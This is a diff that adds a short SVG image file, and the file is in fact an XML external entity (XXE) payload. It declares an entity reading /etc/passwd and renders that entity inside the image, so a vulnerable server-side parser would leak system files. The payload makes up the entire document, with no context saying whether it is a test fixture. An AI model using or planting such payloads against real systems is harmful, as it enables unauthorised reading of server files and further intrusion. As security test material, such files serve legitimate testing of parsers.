@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="300">
+  <foreignObject x="0" y="0" width="500" height="300">
+    <div xmlns="http://www.w3.org/1999/xhtml">&xxe;</div>
+  </foreignObject>
+</svg>
